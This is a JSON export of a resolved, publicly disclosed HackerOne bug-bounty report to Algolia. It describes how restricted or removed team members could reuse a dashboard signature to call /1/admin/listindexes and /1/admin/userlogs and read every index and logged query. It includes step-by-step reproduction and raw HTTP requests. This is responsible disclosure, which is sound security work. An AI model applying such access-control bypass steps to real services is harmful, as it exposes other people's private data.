{"id":156520,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTY1MjA=","url":"https://hackerone.com/reports/156520","title":"Unauthorized team members can leak information and see all API calls through /1/admin/* endpoints, even after they have been removed.","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-04T15:26:03.980Z","submitted_at":"2016-08-04T15:26:03.980Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"eboda","url":"/eboda","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/014/247/a6446792be4fa0fc962bcba2811ef801ddff87be_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":443,"url":"https://hackerone.com/algolia","handle":"algolia","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Algolia","twitter_handle":"algolia","website":"https://algolia.com","about":"Hosted search API that delivers instant and relevant results from the first keystroke"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-11-27T16:43:28.832Z","bug_reporter_agreed_on_going_public_at":"2016-10-28T16:43:06.834Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Summary\n-------------\n\nInvited team members or collaborators on https://www.algolia.com/manage/applications/[APP_ID]/team can use the `/1/admin/*` REST endpoints to leak some information, which they should not be able to have access to.\n\nSteps to reproduce\n--------------\n\n1. Invite a new team member to your application and give him very restrictive rights. In my case I gave him  only `Search` rights and limited his access to an index called `test`.\n2. Login as the new team member and go to https://www.aloglia.com/dashboard . You will be greeted with a `You don't have access to the Algolia Dashboard.` error message.\n3. Check in the page source for `signature` and copy its value, for example on my application it was `fd283b81b38fb9c547fcf2bea763d547e66644839e896e877382b1fcfe598bac`.\n\n    Using this signature, you can perform queries now against `/1/admin/*`, even though you don't have the rights.\n\n/1/admin/listIndexes\n---------------\n\nThe following request will list all indexes of the application including their statistics:\n\n```\nPOST /1/admin/listindexes HTTP/1.1\nHost: c5-eu-1.algolianet.com\n....\n\n{\"applicationID\":\"APP_ID\",\"signature\":\"SIGNATURE\",\"page\":0,\"sortByNbEntries\":1}\n```\n\nOf course you need to replace `applicationID` and `signature` with your own values from above.\n\n/1/admin/userlogs\n-----------------\n\nAn even more interesting endpoint. Here you can see all past queries made to the application. This includes search queries, records added and deleted, indeces created and removed, etc. for all indeces in the application. This basically leaks data from any index.\n\n```\nPOST /1/admin/userlogs HTTP/1.1\nHost: c5-eu-1.algolianet.com\n....\n\n{\"applicationID\":\"APP_ID\",\"signature\":\"SIGNATURE\",\"offset\":0,\"length\":1000,\"type\":\"all\"}\n```\n\nThis will return the whole request body and the whole response body for each query! So for example if somebody performed a search, the attacker will be able to see the whole result of the search in the response body. \n\nHere are two example responses, one for searching and the other for adding a record:\n\n**Searching** (as you can see `answer` contains the whole record)\n```{js}\n{\n                \"timestamp\": \"2016-08-04T15:15:01Z\",\n                \"method\": \"POST\",\n                \"answer_code\": \"200\",\n                \"query_body\": \"\\n{\\n  \\\"params\\\": \\\"query=Monica\u0026page=0\u0026getRankingInfo=1\u0026facets=*\u0026attributesToRetrieve=*\u0026highlightPreTag=%3Cem%3E\u0026highlightPostTag=%3C%2Fem%3E\u0026hitsPerPage=10\u0026facetFilters=%5B%5D\u0026maxValuesPerFacet=100\\\"\\n}\\n\",\n                \"answer\": \"\\n{\\n  \\\"hits\\\": [\\n    {\\n      \\\"name\\\": \\\"Monica Bellucci\\\",\\n      \\\"rating\\\": 3956,\\n      \\\"image_path\\\": \\\"/z3sLuRKP7hQVrvSTsqdLjGSldwG.jpg\\\",\\n      \\\"alternative_name\\\": \\\"Monica Anna Maria Bellucci\\\",\\n      \\\"objectID\\\": \\\"5\\\",\\n      \\\"_highlightResult\\\": {\\n        \\\"name\\\": {\\n          \\\"value\\\": \\\"\u003cem\u003eMonica\u003c/em\u003e Bellucci\\\",\\n          \\\"matchLevel\\\": \\\"full\\\",\\n          \\\"fullyHighlighted\\\": false,\\n          \\\"matchedWords\\\": [\\n            \\\"monica\\\"\\n          ]\\n        },\\n        \\\"alternative_name\\\": {\\n          \\\"value\\\": \\\"\u003cem\u003eMonica\u003c/em\u003e Anna Maria Bellucci\\\",\\n          \\\"matchLevel\\\": \\\"full\\\",\\n          \\\"fullyHighlighted\\\": false,\\n          \\\"matchedWords\\\": [\\n            \\\"monica\\\"\\n          ]\\n        }\\n      },\\n      \\\"_rankingInfo\\\": {\\n        \\\"nbTypos\\\": 0,\\n        \\\"firstMatchedWord\\\": 0,\\n        \\\"proximityDistance\\\": 0,\\n        \\\"userScore\\\": 499,\\n        \\\"geoDistance\\\": 0,\\n        \\\"geoPrecision\\\": 1,\\n        \\\"nbExactWords\\\": 0,\\n        \\\"words\\\": 1,\\n        \\\"filters\\\": 0\\n      }\\n    }\\n  ],\\n  \\\"nbHits\\\": 1,\\n  \\\"page\\\": 0,\\n  \\\"nbPages\\\": 1,\\n  \\\"hitsPerPage\\\": 10,\\n  \\\"processingTimeMS\\\": 1,\\n  \\\"facets\\\": {\\n  },\\n  \\\"exhaustiveFacetsCount\\\": true,\\n  \\\"query\\\": \\\"Monica\\\",\\n  \\\"params\\\": \\\"query=Monica\u0026page=0\u0026getRankingInfo=1\u0026facets=*\u0026attributesToRetrieve=*\u0026highlightPreTag=%3Cem%3E\u0026highlightPostTag=%3C%2Fem%3E\u0026hitsPerPage=10\u0026facetFilters=%5B%5D\u0026maxValuesPerFacet=100\\\",\\n  \\\"serverUsed\\\": \\\"c5-eu-3.algolia.net\\\",\\n  \\\"parsedQuery\\\": \\\"monica\\\",\\n  \\\"timeoutCounts\\\": false,\\n  \\\"timeoutHits\\\": false\\n}\\n\",\n                \"url\": \"/1/indexes/QQQQQQQQ/query?x-algolia-agent=Algolia%20for%20vanilla%20JavaScript%203.14.1\u0026x-algolia-application-id=5QA3U6N0QN\u0026x-algolia-api-key=3f30****************************\",\n                \"ip\": \"....\",\n                \"query_headers\": \"...\",\n                \"sha1\": \"70a7baf41d4756ad3a01199f336d7c45b9624305\",\n                \"nb_api_calls\": \"1\",\n                \"processing_time_ms\": \"1\",\n                \"index\": \"QQQQQQQQ\",\n                \"query_params\": \"query=Monica\u0026page=0\u0026getRankingInfo=1\u0026facets=*\u0026attributesToRetrieve=*\u0026highlightPreTag=%3Cem%3E\u0026highlightPostTag=%3C%2Fem%3E\u0026hitsPerPage=10\u0026facetFilters=%5B%5D\u0026maxValuesPerFacet=100\",\n                \"query_nb_hits\": \"1\"\n            }\n```\n**Adding a record**\n```{js}\n {\n                \"timestamp\": \"2016-08-04T15:14:56Z\",\n                \"method\": \"POST\",\n                \"answer_code\": \"201\",\n                \"query_body\": \"\\n{\\n  \\\"name\\\": \\\"Just a test\\\",\\n  \\\"rating\\\": 1337,\\n  \\\"image_path\\\": \\\"Record added\\\",\\n  \\\"alternative_name\\\": \\\"Everything leaked\\\",\\n  \\\"objectID\\\": \\\"5111\\\"\\n}\\n\",\n                \"answer\": \"\\n{\\n  \\\"createdAt\\\": \\\"2016-08-04T15:14:56.405Z\\\",\\n  \\\"taskID\\\": 18077851,\\n  \\\"objectID\\\": \\\"5111\\\"\\n}\\n\",\n                \"url\": \"/1/indexes/QQQQQQQQ?x-algolia-agent=Algolia%20for%20vanilla%20JavaScript%203.14.1\u0026x-algolia-application-id=****\u0026x-algolia-api-key=3f30****************************\",\n                \"ip\": \"xxxxx\",\n                \"query_headers\": \"...\",\n                \"sha1\": \"ee9f6ad7345be899f3a81b0b150bb75c9abc46e3\",\n                \"nb_api_calls\": \"1\",\n                \"processing_time_ms\": \"1\",\n                \"index\": \"QQQQQQQQ\"\n            }\n```\n\nClearly, the attacker can dump all indeces if he just goes back far enough where they were created.\n\nThe other two endpoints I found are `/1/admin/stats/INDEXNAME`, which returns the same as `/1/admin/listIndexes`, but only for one specific index and `/1/admin/building`, which purpose I didn't quite figure out.\n\nFinal note\n-----------\n\nNote that the signature is application specific and completely API key independent.\n\nFor one that means, if I use the users API key to list indexes via `/1/indexes` endpoint, it will only return an answer if I ahve given the user `listIndexes` rights and it will only return those indeces he has access to. Whereas with the signature the users rights are completely ignored.\n\nIt also means though, that if I remove an old team member he still continues to have access to the above endpoints. Even if the admin regenrates the admin API key, the signature remains the same. Therefore, once a team member obtained the signature, he will have access indefinitely to the application. The owner can't do anything as far as I can tell.","bounty_amount":"400.0","formatted_bounty":"$400","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-11-27T16:43:06.864Z","allow_singular_disclosure_after":-153695002.638173,"singular_disclosure_allowed":true,"vote_count":16,"voters":["fqdn","bogdantcaciuc","yaworsk","dilawer01","mpz","madrobot","malcolmx","paresh_parmar","alfredsaonoy","fantam1","and 6 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1108205,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for the report. We're evaluating the impact.","automated_response":false,"created_at":"2016-08-05T12:07:38.924Z","updated_at":"2016-08-05T12:07:38.924Z","actor":{"username":"adams","cleared":false,"url":"/adams","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/053/f25684e04947d3756222aa2b2b7e43b62b4dfe96_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1163316,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey there @adams, any news on this one?","automated_response":false,"created_at":"2016-08-30T20:37:49.661Z","updated_at":"2016-08-30T20:37:49.661Z","actor":{"username":"eboda","cleared":true,"url":"/eboda","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/247/a6446792be4fa0fc962bcba2811ef801ddff87be_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1237261,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, no updates. We have a solution is development but the proper fixed turned out to be more complex and requires more time.","automated_response":false,"created_at":"2016-10-07T14:23:20.631Z","updated_at":"2016-10-07T14:23:20.631Z","actor":{"username":"adams","cleared":false,"url":"/adams","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/053/f25684e04947d3756222aa2b2b7e43b62b4dfe96_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1268229,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @eboda.\n\nThanks for waiting. The issue described in this report took a bit of time to fix but it should now be resolved.\n\nCan you please confirm ?","automated_response":false,"created_at":"2016-10-26T08:20:44.762Z","updated_at":"2016-10-26T08:20:44.762Z","actor":{"username":"alem","cleared":false,"url":"/alem","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/059/a400dfb804a1a0462376e8851473f292f4e5e269_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1268340,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @alexandremeunier ,\n\nNo problem and yep, the issue seems to be fixed now!","automated_response":false,"created_at":"2016-10-26T09:32:34.288Z","updated_at":"2016-10-26T09:32:34.288Z","actor":{"username":"eboda","cleared":true,"url":"/eboda","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/247/a6446792be4fa0fc962bcba2811ef801ddff87be_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1268405,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Actually there is a related issue with the Monitoring API key:\nOnce a user is invited into the team and has access to it, it can not be revoked or regenerated anymore even if the user is removed from the team. ","automated_response":false,"created_at":"2016-10-26T10:10:58.300Z","updated_at":"2016-10-26T10:10:58.300Z","actor":{"username":"eboda","cleared":true,"url":"/eboda","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/247/a6446792be4fa0fc962bcba2811ef801ddff87be_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1273028,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This is a duplicate of another report so I'm just going to go ahead and close this one. Many thanks for your help @eboda ","automated_response":false,"created_at":"2016-10-28T15:56:13.138Z","updated_at":"2016-10-28T15:56:13.138Z","actor":{"username":"alem","cleared":false,"url":"/alem","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/059/a400dfb804a1a0462376e8851473f292f4e5e269_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"eboda","url":"/eboda"},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1273029,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2016-10-28T15:56:34.383Z","updated_at":"2016-10-28T15:56:34.383Z","actor":{"url":"/algolia","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Algolia"}},"bounty_amount":"400.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"algolia","collaborator":{"username":"eboda","url":"/eboda"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1273104,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome, thanks for the bounty! Do you mind disclosing this report?","automated_response":false,"created_at":"2016-10-28T16:42:35.636Z","updated_at":"2016-10-28T16:42:35.636Z","actor":{"username":"eboda","cleared":true,"url":"/eboda","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/247/a6446792be4fa0fc962bcba2811ef801ddff87be_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1273106,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-10-28T16:43:06.850Z","updated_at":"2016-10-28T16:43:06.850Z","first_to_agree":true,"actor":{"username":"eboda","cleared":true,"url":"/eboda","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/247/a6446792be4fa0fc962bcba2811ef801ddff87be_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1321798,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-11-27T16:43:28.848Z","updated_at":"2016-11-27T16:43:28.848Z","actor":{"url":"/algolia","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Algolia"}},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}